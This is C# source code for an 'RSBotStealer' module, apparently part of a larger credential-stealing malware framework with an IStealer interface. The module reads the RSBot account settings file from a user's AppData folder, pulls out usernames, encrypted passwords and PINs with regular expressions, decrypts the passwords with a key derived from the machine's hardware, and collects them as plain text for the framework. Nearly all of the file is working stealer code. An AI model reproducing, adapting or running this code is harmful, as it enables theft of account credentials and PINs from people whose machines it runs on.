#region Imports

using System;
using System.Collections;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using sub.Util.Misc;

#endregion

namespace sub.Stealers
{
    internal class RSBotStealer : IStealer
    {
        private const string SettingsFileName = "RSBot_Accounts.ini";

        private string _settingsFile = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), SettingsFileName);

        #region IStealer Members
        private string _name = "RSBotStealer";
        public string Name
        {
            get { return _name; }
            set { _name = value; }
        }

        public string Data { get; set; }

        public void Collect()
        {
            if (!File.Exists(_settingsFile))
                return;
            IEnumerable<RSBotAccount> accounts = GetLocalAccounts(HardwareInfo.GetLocalKey());
            Data += "RSBot Account Stealer\r\n\r\n";
            foreach (RSBotAccount acc in accounts)
            {
                Data += "Username: " + acc.UserName + ", Password: " + acc.Password + ", Pin: " + acc.Pin + "\r\n";
            }
        }

        #endregion

        private IEnumerable<RSBotAccount> GetLocalAccounts(byte[] key)
        {
            using (StreamReader reader = new StreamReader(_settingsFile))
            {
                return GetLocalAccounts(reader.ReadToEnd(), key);
            }
        }

        private IEnumerable<RSBotAccount> GetLocalAccounts(string accountFileData, byte[] key)
        {
            //TODO: Make these line up.
            //If there are two accounts and only the second has a pin
            //It will show the pin for the first account
            //This happens with passwords too
            ArrayList usernames = new ArrayList();
            ArrayList passwords = new ArrayList();
            ArrayList pins = new ArrayList();

            Regex pat = new Regex(@"(?<=\[)[A-Za-z0-9_]{1,12}(?=\])");
            MatchCollection matches = pat.Matches(accountFileData);
            foreach (Match m in matches)
            {
                usernames.Add(m.Value);
            }

            Regex passpat = new Regex(@"(?<=password\=)[a0-9-]{1,50}");
            MatchCollection passmatches = passpat.Matches(accountFileData);
            foreach (Match m in passmatches)
            {
                passwords.Add(m.Value);
            }

            Regex pinpat = new Regex(@"(?<=pin\=)[0-9]{4}");
            MatchCollection pinmatches = pinpat.Matches(accountFileData);
            foreach (Match m in pinmatches)
            {
                pins.Add(m.Value);
            }

            List<RSBotAccount> ret = new List<RSBotAccount>();
            foreach (string user in usernames)
            {
                int idx = usernames.IndexOf(user);
                const string emp = "None";

                string pass = idx < passwords.Count ? DecryptPassword(passwords[idx].ToString(), key) : emp;
                string pin = idx < pins.Count ? pins[idx].ToString() : emp;
                if (string.IsNullOrEmpty(pass) && pass != emp)
                {
                    pass = DecryptPassword(pass, key);
                }
                ret.Add(new RSBotAccount(user, pass, pin));
            }
            return ret.ToArray();
        }


        private static sbyte ToSByte(byte b)
        {
            return (sbyte) b;
        }


        private string DecryptPassword(string passwordHash, byte[] key)
        {
            byte[] array;
            using (SHA1 sha = SHA1.Create())
            {
                array = sha.ComputeHash(key);
            }
            sbyte[] numArray = Array.ConvertAll(array, ToSByte);
            string[] strArray = passwordHash.Split(new char[] {'a'});

            byte[] bytes = new byte[(strArray.Length - 1) + 1];
            int index = 0;
            while (index < array.Length)
            {
                int result;
                int.TryParse(strArray[index], out result);
                sbyte num3 = (sbyte) result;
                if (num3 == numArray[index])
                {
                    break;
                }
                bytes[index] = (byte) ((sbyte) (num3 - numArray[index]));
                index++;
            }
            return Encoding.Default.GetString(bytes, 0, index);
        }

        #region Nested type: RSBotAccount

        internal class RSBotAccount
        {
            public string Password;
            public string Pin;
            public string UserName;

            public RSBotAccount(string user, string pass, string pin)
            {
                UserName = user;
                Password = pass;
                Pin = pin;
            }
        }

        #endregion
    }
}